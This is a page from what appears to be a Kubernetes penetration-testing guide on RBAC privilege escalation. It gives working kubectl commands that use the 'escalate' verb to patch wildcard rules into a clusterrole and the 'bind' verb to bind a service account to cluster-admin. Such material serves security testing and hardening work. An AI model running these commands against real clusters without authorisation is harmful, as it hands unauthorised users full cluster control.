---
title: "Escalate and bind verbs: granting yourself permissions you lack"
order: 4
description: "Kubernetes normally stops an identity from creating a role with more permissions than it holds, but the escalate verb on roles and the bind verb on rolebindings switch that check off. An identity with either can author a cluster-admin role or bind itself to one, escalating to full control from a narrow starting grant."
keywords:
  - escalate verb
  - bind verb
  - rbac
  - clusterrolebinding
  - privilege escalation
---

# Escalate and bind verbs

RBAC has a built-in anti-escalation rule: to create or update a role, you must already hold every permission that role grants, and to create a binding you must hold the permissions in the referenced role. Two verbs deliberately bypass this. The `escalate` verb on `roles`/`clusterroles` lets you write a role with permissions beyond your own, and the `bind` verb on `rolebindings`/`clusterrolebindings` lets you bind a subject to a role whose permissions you do not hold. Either one defeats the containment and reaches cluster admin.

Check for them:

```bash
kubectl auth can-i escalate clusterroles
kubectl auth can-i bind clusterroles
kubectl auth can-i update clusterroles        # update also allows rewriting a role you can edit
```

## Route: escalate to rewrite a role

```bash
# with escalate, add cluster-admin-level rules to a role you can write,
# then ensure your identity is bound to it
kubectl patch clusterrole <role-you-can-edit> --type=json -p='[{"op":"add","path":"/rules/-",
  "value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'
```

## Route: bind yourself to cluster-admin

```bash
# with bind, bind your service account directly to the built-in cluster-admin
cat <<YAML | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: x }
roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
subjects:
- { kind: ServiceAccount, name: <my-sa>, namespace: <my-ns> }
YAML
# then act with the now-admin identity
kubectl auth can-i '*' '*'
```

## Exploitation notes

- `bind` to the pre-existing `cluster-admin` ClusterRole is the cleanest path: you never author new permissions, you only reference an admin role that already exists, so the only gate is the `bind` verb.
- `escalate` is used when no suitable admin role exists to bind, or when you can already edit a role that is bound to you; it lets you write the permissions directly.
- These verbs are rare in well-run clusters precisely because they are escalation by design; finding either in `auth can-i --list` is a direct win.

## References

- [Kubernetes: privilege escalation prevention](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping)
- [Kubernetes: RBAC verbs](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#referring-to-resources)
- [HackTricks: Kubernetes RBAC escalation](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-role-based-access-control-rbac)
